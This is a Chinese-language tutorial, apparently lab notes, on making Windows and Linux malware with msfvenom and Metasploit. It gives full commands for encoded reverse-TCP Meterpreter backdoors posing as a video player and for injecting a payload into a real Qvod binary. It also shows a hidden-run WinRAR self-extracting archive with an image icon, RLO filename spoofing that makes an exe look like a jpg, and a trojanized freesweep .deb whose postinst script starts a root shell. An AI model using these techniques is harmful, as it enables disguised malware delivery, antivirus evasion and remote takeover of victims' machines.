# 制作 windows 和 linux 客户端恶意软件进行渗透



#### 一、制作 Windows 恶意软件获取 shell 

> msfvenom 是 msfpayload,msfencode 的结合体，可利用 msfvenom 生成木马程序,并在目标机 上执行,在本地监听上线。

###### 1、生成西瓜影音.exe 后门程序

```
##使用一个编码器##
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="监听机IP" LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o  /var/www/html/西瓜影音 1.exe 
```

```
##使用两个编码器组合编码##  
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.36.136 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86  --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/西瓜影音 2.exe 
```

```
参数说明
	-a 					#指定架构如 x86 x64。 x86 代表 32 位， x64 代表 64 位。 32 位软件可以在 64 位系统上运 行。所以						 #我们生成 32 位的后门，这样在 32 位和 64 位系统中都可以使用。 
    
	--platform 			#指定平台，这里选择 windows，通过 
	--l platforms 		#可以查看所有支持的平台 
	-p 					#设置攻击载荷，我们使用 windows/meterpreter/reverse_tcp。
	
	-l payloads 		#查看所 有攻击载荷 LHOST 目标主机执行程序后连接我们 Kali 的地址 LPORT 目标主机执行程序后连接我们 						#Kali 的端口 	
	
	-b 					#去掉坏字符，坏字符会影响 payload 正常执行。 扩展：\x00 代表 16 进制的“00”组成的字符串。通过 							#ASCII 码换成能识别的就是："00" - "00000000" - NUL。由于"00000000"是不可见字符，所以代码中没						  #用。 
	
	-e 					#指定编码器，也就是所谓的免杀，x86/shikata_ga_nai 是 msf 自带的编码器，可以通过 
	-l  				#encoders 查看所有编码器 
	-i 					#指定 payload 有效载荷编码迭代次数。 指定编码加密次数，为了让杀毒软件，更难查出源代码 
	-f 					#指定生成格式，可以是 raw，exe，elf，jar，c 语言的，python 的，java 的……
    
	-l  formats 		#查看所有支持的格式 -o 指定文件名称和导出位置。 
						指定到网站根目录/var/www/html，方便在肉机上下载后门程序
```

###### 2、在 MSF 上启动 handler 开始监听后门程序

```
msfconsole msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > set LHOST 192.168.36.136 
msf6 exploit(multi/handler) > set LPORT 4444 
msf6 exploit(multi/handler) > exploit
```

###### 3、在 Kali 上启动 apache 为后门程序提供下载地址 

```
##在 Kali 上再打开一个终端，启动 apache，方便在 win7 上下载执行程序 ##
systemctl start apache2 #kali 自带 apache 服务器 
```

###### 4、打开 win7 访问 Kali 搭建的 Web 服务下载执行文件。 

```
打开浏览器分别访问： http://192.168.36.136/西瓜影音 1.exe 
				  http://192.168.36.136/西瓜影音 2.exe 
```

> 使用 virustotal 检测下生成后门的免杀能力，VirusTotal.com 是一个免费的病毒，蠕虫，木马和各 种恶意软件分析服务，可以针对可疑文件和网址进行快速检测，最初由 Hispasec 维护。它与传统杀毒软 件的不同之处是它通过多种杀毒引擎扫描文件。使用多种反病毒引擎可以令用户们通过各杀毒引擎的侦测 结果，判断上传的文件是否为恶意软件。 
>
> 打开：https://www.virustotal.com/ 双击运行 西瓜影音 1.exe 程序 

###### 5、在 MSF 终端查看建立的 session Shell 中输入 ipconfig 查看 win7 主机的 IP 地址。 

```
meterpreter > ipconfig  
meterpreter > dir #查看当前目录下的内容 
```

###### 6、将会话保存到后台，方便以后使用 

```
meterpreter > background  
msf6 exploit(multi/handler) > sessions 			#查看会话 
msf6 exploit(multi/handler) > sessions -i 1 	#指定会话 ID，调用新的会话 
meterpreter > exit 								#如果不想使用了，就退出，断开会话 7、查看拿到会话													后可以执行哪些命令 
meterpreter > help 								#由于命令太多，可以体验下每个命令的使用方法
```

> ###### 模拟黑客给真正的快播软件加上后门 
>
> 1、先下载一个正常的快播软件 我已经下载绿色版本，免安装的快播软件。 解开这个包后，找到 QvodTerminal.exe 。 
>
> ```
> 给一个正常的软件加后门的思路是什么？ 
> 先查看主程序会调用哪些附加的小程序，然后把 payload 后门和这些小程序绑定到一起。当然也可以直接加到主程序上，但是加主程序上，有时报错。当 QvodPlayer.exe 主程序运行时，会自动调用 QvodTerminal.exe 这个小程序。
> ```
>
> 2、上传到 QvodTerminal.exe 到 kali 上 
>
> 3、对 QvodTerminal.exe 注入 payload 后门程序 
>
> ```
> msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.36.136 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -x  QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe 
> ```
>
> 4、使用绑定了后门的 QvodTerminal.exe 替换原来的 QvodTerminal.exe 在 win7 虚拟机上下载绑定了后门的 QvodTerminal.exe 在浏览器上访问：http://192.168.36.136/QvodTerminal.exe 下载 QvodTerminal.exe 将下载的 QvodTerminal.exe 替换原文件中的 QvodTerminal.exe 
>
> 5、在 kali 上开始监听后门 
>
> ```
> msf6 > use exploit/multi/handler 
> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
> msf6 exploit(multi/handler) > set LHOST 192.168.36.136 
> msf6 exploit(multi/handler) > set LPORT 4444 msf6 exploit(multi/handler) > exploit 
> 
> 			[*] Started reverse TCP handler on "监听机IP":4444 
> 			
> ```
>
> 6、打开快播主程序准备看苍老师电影 一会弹出的这个窗口，点运行就可以了。 
>
> 7、在 Kali 上查看会话已经建立了，说明后门运行成功了

#### 二、实战-利用自解压自动运行并上线 MSF 

###### 1、生成伪装恶意程序的封面图标 需要安装 rar 压缩工具。 

WinRAR 官网：http://www.winrar.com.cn/ 下载安装即可不需要特殊配置。 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.36.136 LPORT=4444 -f exe -o /var/www/html/ dongman.exe                       	#msfvenom 生成 exe  
```

> ```
> 准备一张图片 		
> 将图片生成 ico 图标用于恶意程序的封面图标：http://www.ico51.cn/ 
> 注：图片尺寸选最大的，也可以找一下其它的 ico 图标生成网站。 转换后会自动下载 
> ```

###### 2、捆绑恶意程序和图片并设置自动运行 

```
选中dongman.exe和dongman.jpg 
1、常规 >> 添加到压缩文件 >> 勾选：创建自解压格式压缩文件  
2、高级 >> 设置自解压选项 >> 常规 >> 解压路径(输入)：C:\Windows\Temp >> 勾选：绝对路径  
		注：dongman.exe 和 dongman.jpg 会被解压到 C:\Windows\Temp 
3、设置 >> 解压后运行dongman.exe 和dongman.jpg（输入）
	C:\Windows\Temp\dongman.jpg 
	C:\Windows\Temp\dongman.exe 
4、模式 >> 全部隐藏
5、更新 >> 更新模式 >> 勾选：解压并替换文件 >> 覆盖模式 >> 勾选：覆盖所有文件

 	更新方式 
		多次解压可能会出现文件已经存在的情况，如果文件存在会询问用户。 
		建议选择覆盖所有文件或跳过已存在的文件。 
	覆盖：缺点是如果 exe 程序已经运行那么覆盖会失败。 
	跳过：如果 exe 文件的参数有修改跳过后则运行的还是旧版本。
 
6、文本和图标 >> 最下面的浏览 添加生成的 ico 图标。 
7、生成后的自解压文件。		*#静默方式解压 #*
 
建议：每次制作不要用相同的名字。    
```

###### 3、使用 Unicode 字符修改文件名后缀 

```
重命名 选中文件名鼠标右键插入 RLO RLO 从右到左 LRO 从左到右  
插入 gpj，RLO 是从右到左，所以最终 gpj=jpg 此时文件名后缀为 exe.jpg，那这样还不理想，文件名部分是 exe 还是没什么意义。 
添加文件名 重命名，在 exe 前面插入 Unicode 控制字符 LRO  输入文件名：动漫 exe.jpg 
最终效果，文件有 ico 图标伪装图片的缩略图，文件名后缀.jpg 来伪装文件类型。 
注：exe.不可以去掉 

		自行体会
```

###### 4、通过访问图片自动获取目标 shell 

```
msfdb run  
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf5 exploit(multi/handler) > set LHOST 192.168.36.136 
msf5 exploit(multi/handler) > set LPORT 4444 
msf6 exploit(multi/handler) > run 		

打开动漫 exe.jpg 图片文件自动打开  
MSF 成功上线 临时目录下文件也都存在。 C:\Windows\Temp
```

#### 三、实战-制作 Linux 恶意软件获取 shell 

###### 1、使用 msfvenom 生成 linux 可执行文件 

```
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.36.136 LPORT=4444 -b "\x00" -f elf -o /var/www/html/xuegod

 	参数和生成 Windows 差不多 
 			--platform 指定 linux -f 指定 elf 即 linux 操作系统的可执行文件类型 
 			-b 去掉坏字符 
 			
systemctl start apache2 #开启 apache  
```

###### 2、MSF 配置监听 

```
msfconsole 
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > set LHOST 192.168.36.136 msf6 exploit(multi/handler) > set LPORT 4444 
msf6 exploit(multi/handler) > exploit 	

		[*] Started reverse TCP handler on 192.168.36.136:4444 
		
打开 centos 7.5 linux 虚拟机，新建一个终端： 
wget http://192.168.36.136/xuegod 	#下载后门 添加执行权限 
chmod +x xuegod   
./xuegod  			#执行程序

我们回到 MSF 控制台 Session 已经建立 
meterpreter > ifconfig  
```

#### 四、实战-制作恶意 deb 软件包来触发后门 

```
制作恶意软件包使用--download-only 方式下载软件包不进行安装 
apt --download-only install freesweep 	#freesweep 
```

```
将软件包移动到 root 目录 
mv /var/cache/apt/archives/freesweep_1.0.1-2_amd64.deb ~/ 
```

```
解压软件包到 free 目录 
dpkg -x freesweep_1.0.1-2_amd64.deb free 
```

```
生成恶意代码到软件包源文件中 
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.36.136 LPORT=4444 -b "\x00" -f elf -o  /root/free/usr/games/freesweep_sources 
 
拓展：生成软件包时无论是 payload 的和软件包信息都需要选择能够在目标操作系统上执行的。
```

```
创建软件包信息目录 
mkdir /root/free/DEBIAN && cd /root/free/DEBIAN
```

```
创建软件包的信息文件 
tee /root/free/DEBIAN/control << 'EOF' 
 
	Package: freesweep 
	Version: 1.0.1-1 
	Section: Games and Amusement *
	Priority: optional 
	Architecture: amd64
	Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com) 
	Description: a text-based minesweeper Freesweep is an implementation of the popular  minesweeper game, where one tries to find all the mines without igniting any, based on  hints given by the computer. Unlike most implementations of this game, Freesweep works  in any visual text display - in Linux console, in an xterm, and in most text-based terminals  currently in use. 
	EOF 
```

```
创建 deb 软件包，安装后脚本文件，来加载后门 
tee /root/free/DEBIAN/postinst << 'EOF' 
	#!/bin/bash 
	sudo chmod 2755 /usr/games/freesweep_sources 
	sudo /usr/games/freesweep_sources &  
	EOF 
	
第三段是我们要执行的恶意代码 
& 是将命令放到后台运行 
```

```
给脚本文件添加执行权限 
chmod 755 /root/free/DEBIAN/postinst 
```

```
构建新的 deb 安装包 
dpkg-deb --build /root/free/ 

	dpkg-deb: 正在 '/root/free.deb' 中构建软件包 'freesweep'。

注：会在当前目录下生成构建的软件包 freesweep.deb ,我们当前的目录是/root 

ls /root/free.deb 
```

```
新打开一个终端 CTRL+SHIFT+T，生成 MSF 监听 
msfconsole 
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > set LHOST 192.168.36.136 
msf6 exploit(multi/handler) > set LPORT 4444 
msf6 exploit(multi/handler) > exploit 
```

```
这里最好是在 Kali 中执行如果再 XSHELL 中执行可能会导致窗口卡死。
dpkg -i free.deb 
回到 MSF 控制台 
meterpreter > getuid 

	uid=0 	#表示 root 权限 
```

退出 session 需要使用 quit 正常退出 session 否则会影响下次连接。 

```
卸载软件包 
dpkg -r freesweep 我们发现就算恶意软件包被卸载，payload 依旧正常运行。
exit 退出即可
```

```
退出 session 需要使用 quit 正常退出 session 否则会影响下次连接。 
meterpreter > quit 

	[*] Shutting down Meterpreter... 
	[*] 192.168.36.136 - Meterpreter session 2 closed. Reason: User exit
```























